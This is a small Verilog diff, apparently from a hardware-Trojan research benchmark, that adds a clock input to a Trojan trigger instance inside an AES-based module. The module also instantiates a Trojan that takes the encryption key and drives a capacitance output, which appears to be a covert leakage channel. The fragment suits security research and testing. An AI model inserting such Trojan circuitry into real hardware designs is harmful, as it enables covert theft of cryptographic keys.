@@ -47,7 +47,7 @@ module top(clk, rst, state_change, key_change, out, capacitance);
 		end
 
 
-    Trojan_Trigger Trigger (rst, state, Tj_Trig); 
+	Trojan_Trigger Trigger (rst, clk, state, Tj_Trig); 
 	TSC Trojan (rst, clk, Tj_Trig, key, state, Capacitance); 
 
 	assign out = ^aes_out;
